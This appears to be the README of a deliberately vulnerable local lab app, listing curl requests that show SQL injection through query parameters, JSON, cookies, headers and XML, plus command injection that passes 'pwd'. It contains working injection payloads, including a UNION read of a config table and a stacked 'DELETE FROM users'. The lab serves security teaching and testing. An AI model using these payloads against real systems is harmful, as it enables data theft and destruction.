# vulnerable

## SQL Injection

### GET request - Get list of users - filter by query param
```bash
curl http://localhost:8080/vun/sql/example1/api/users?name=michal
curl http://localhost:8080/vun/sql/example1/api/users?name=michal%27%20or%201=1%20--%20-
curl http://localhost:8080/vun/sql/example1/api/users?name=michal%27%20UNION%20SELECT%20%2A%20FROM%20config%20%2D%2D%20%2D
```

### POST request - Get list of users - filter by json body
```bash
curl -X POST http://localhost:8080/vun/sql/example2/api/users -H "Content-Type: application/json" -d "{\"filter\": \"michal\"}"  
curl -X POST http://localhost:8080/vun/sql/example2/api/users -H "Content-Type: application/json" -d "{\"filter\": \"michal' or 1=1 -- -\"}"  
```

### Post request - Create new User
```bash
curl -X POST http://localhost:8080/vun/sql/example3/api/users -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker\"}"  
curl -X POST http://localhost:8080/vun/sql/example3/api/users -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker'); SELECT * FROM users; -- - \"}"  
curl -X POST http://localhost:8080/vun/sql/example3/api/users -H "Content-Type: application/json" -d "{\"name\": \"michal\", \"surname\": \"hacker'); DELETE FROM users; -- - \"}"  
```

### GET request - Get list of users - filter in cookie
```bash
curl http://localhost:8080/vun/sql/example4/api/users --cookie "name=michal"
curl http://localhost:8080/vun/sql/example4/api/users --cookie "name=michal'%20or%201=1%20--%20-"
```

### GET request - Get list of users - filter in header
```bash
curl http://localhost:8080/vun/sql/example5/api/users -H "X-Filter:michal"
curl http://localhost:8080/vun/sql/example5/api/users -H "X-Filter:michal' or 1=1 -- -"
```

### POST request - Get list of users - filter by xml body
```bash
curl -X POST http://localhost:8080/vun/sql/example6/api/users -H "Content-Type: application/xml" -d "<filters><filter>michal</filter></filters>"  
curl -X POST http://localhost:8080/vun/sql/example6/api/users -H "Content-Type: application/xml" -d "<filters><filter>michal' or 1=1 -- -</filter></filters>"
```

## CMD Injection

### GET request - cmd in query param
```bash
curl http://localhost:8080/vun/cmd/example1/?cmd=pwd
```

### POST request - cmd filter by json body
```bash
curl -X POST http://localhost:8080/vun/cmd/example2/ -H "Content-Type: application/json" -d "{\"filter\": \"pwd\"}"  
```

### POST request - cmd filter by xml body
```bash
curl -X POST http://localhost:8080/vun/cmd/example3/ -H "Content-Type: application/xml" -d "<filters><filter>pwd</filter></filters>"  
```

### GET request - cmd in cookie
```bash
curl http://localhost:8080/vun/cmd/example4/ --cookie "cmd=pwd"
```